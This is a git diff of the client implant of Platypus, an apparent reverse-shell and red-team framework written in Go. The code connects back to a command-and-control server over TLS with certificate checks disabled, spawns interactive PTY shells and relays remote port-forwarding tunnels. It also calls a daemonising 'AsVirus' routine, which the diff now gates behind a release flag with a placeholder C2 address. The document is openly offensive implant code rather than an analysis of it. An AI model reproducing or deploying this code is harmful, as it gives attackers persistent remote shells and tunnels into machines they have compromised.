@@ -21,6 +21,7 @@ import (
 	"github.com/WangYihang/Platypus/lib/util/hash"
 	"github.com/WangYihang/Platypus/lib/util/log"
 	"github.com/WangYihang/Platypus/lib/util/message"
+	"github.com/WangYihang/Platypus/lib/util/str"
 	"github.com/creack/pty"
 	"github.com/sevlyar/go-daemon"
 )
@@ -156,7 +157,7 @@ func handleConnection(c *Client) {
 
 			go func() {
 				for {
-					buffer := make([]byte, 0x400)
+					buffer := make([]byte, 0x4000)
 					n, err := ptmx.Read(buffer)
 					if err != nil {
 						if err == io.EOF {
@@ -338,7 +339,7 @@ func handleConnection(c *Client) {
 					(*conn).Close()
 				}
 			} else {
-				log.Error("No such tunnel")
+				log.Debug("No such tunnel: %s", token)
 			}
 		case message.PULL_TUNNEL_DISCONNECT:
 			token := msg.Body.(*message.BodyPullTunnelDisconnect).Token
@@ -353,36 +354,41 @@ func handleConnection(c *Client) {
 					},
 				})
 			} else {
-				log.Error("No such tunnel")
+				log.Debug("No such tunnel: %s", token)
 			}
 		case message.PUSH_TUNNEL_CREATE:
 			address := msg.Body.(*message.BodyPushTunnelCreate).Address
-			token := msg.Body.(*message.BodyPushTunnelCreate).Token
+			log.Info("Creating remote port forwarding from %s", address)
 			server, err := net.Listen("tcp", address)
 			if err != nil {
+				log.Error("Server (%s) create failed: %s", address, err.Error())
 				c.Encoder.Encode(message.Message{
 					Type: message.PUSH_TUNNEL_CREATE_FAILED,
 					Body: message.BodyPushTunnelCreateFailed{
-						Token:  token,
-						Reason: err.Error(),
+						Address: address,
+						Reason:  err.Error(),
 					},
 				})
 			} else {
+				log.Error("Server created (%s)", address)
 				c.Encoder.Encode(message.Message{
 					Type: message.PUSH_TUNNEL_CREATED,
 					Body: message.BodyPushTunnelCreated{
-						Token: token,
+						Address: address,
 					},
 				})
 
 				go func() {
 					for {
 						conn, err := server.Accept()
+						token := str.RandomString(0x10)
+						log.Success("Connection came from: %s", conn.RemoteAddr().String())
 						if err == nil {
 							c.Encoder.Encode(message.Message{
 								Type: message.PUSH_TUNNEL_CONNECT,
 								Body: message.BodyPushTunnelConnect{
-									Token: token,
+									Token:   token,
+									Address: address,
 								},
 							})
 							pushTunnels[token] = &conn
@@ -392,12 +398,14 @@ func handleConnection(c *Client) {
 			}
 		case message.PUSH_TUNNEL_CONNECTED:
 			token := msg.Body.(*message.BodyPushTunnelConnected).Token
+			log.Success("Connection (%s) connected", token)
 			if conn, exists := pushTunnels[token]; exists {
 				go func() {
 					for {
-						buffer := make([]byte, 0x400)
+						buffer := make([]byte, 0x4000)
 						n, err := (*conn).Read(buffer)
 						if err != nil {
+							log.Error("Read from (%s) failed: %s", token, err.Error())
 							c.Encoder.Encode(message.Message{
 								Type: message.PUSH_TUNNEL_DISCONNECTED,
 								Body: message.BodyPushTunnelDisonnected{
@@ -409,6 +417,7 @@ func handleConnection(c *Client) {
 							delete(pushTunnels, token)
 							break
 						} else {
+							log.Debug("%d bytes read from (%s)", n, token)
 							c.Encoder.Encode(message.Message{
 								Type: message.PUSH_TUNNEL_DATA,
 								Body: message.BodyPushTunnelData{
@@ -420,7 +429,7 @@ func handleConnection(c *Client) {
 					}
 				}()
 			} else {
-				log.Error("No such tunnel")
+				log.Debug("No such tunnel (PUSH_TUNNEL_CONNECTED): %s", token)
 			}
 		case message.PUSH_TUNNEL_DISCONNECTED:
 			token := msg.Body.(*message.BodyPushTunnelDisonnected).Token
@@ -428,7 +437,7 @@ func handleConnection(c *Client) {
 				(*conn).Close()
 				delete(pushTunnels, token)
 			} else {
-				log.Error("No such tunnel")
+				log.Debug("No such tunnel (PUSH_TUNNEL_DISCONNECTED): %s", token)
 			}
 		case message.PUSH_TUNNEL_CONNECT_FAILED:
 			token := msg.Body.(*message.BodyPushTunnelConnectFailed).Token
@@ -436,7 +445,7 @@ func handleConnection(c *Client) {
 				(*conn).Close()
 				delete(pushTunnels, token)
 			} else {
-				log.Error("No such tunnel")
+				log.Debug("No such tunnel (PUSH_TUNNEL_CONNECT_FAILED): %s", token)
 			}
 		case message.PUSH_TUNNEL_DATA:
 			token := msg.Body.(*message.BodyPushTunnelData).Token
@@ -448,13 +457,13 @@ func handleConnection(c *Client) {
 					delete(pushTunnels, token)
 				}
 			} else {
-				log.Error("No such tunnel")
+				log.Debug("No such tunnel (PUSH_TUNNEL_DATA): %s", token)
 			}
 		}
 	}
 }
 
-func StartClient() bool {
+func StartClient(service string) bool {
 	needRetry := true
 	certBuilder := new(strings.Builder)
 	keyBuilder := new(strings.Builder)
@@ -470,7 +479,6 @@ func StartClient() bool {
 	}
 
 	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
-	service := strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
 	if hash.MD5(service) != "4d1bf9fd5962f16f6b4b53a387a6d852" {
 		log.Debug("Connecting to: %s", service)
 		conn, err := tls.Dial("tcp", service, &config)
@@ -527,14 +535,21 @@ func AsVirus() {
 }
 
 func main() {
-	AsVirus()
+	release := false
+	if release {
+		AsVirus()
+	}
 	message.RegisterGob()
 	backoff = CreateBackOff()
 	processes = map[string]*TermiteProcess{}
 	pullTunnels = map[string]*net.Conn{}
 	pushTunnels = map[string]*net.Conn{}
+	service := "127.0.0.1:13337"
+	if release {
+		service = strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
+	}
 	for {
-		if !StartClient() {
+		if !StartClient(service) {
 			break
 		}
 		add := (int64(rand.Uint64()) % backoff.Current)
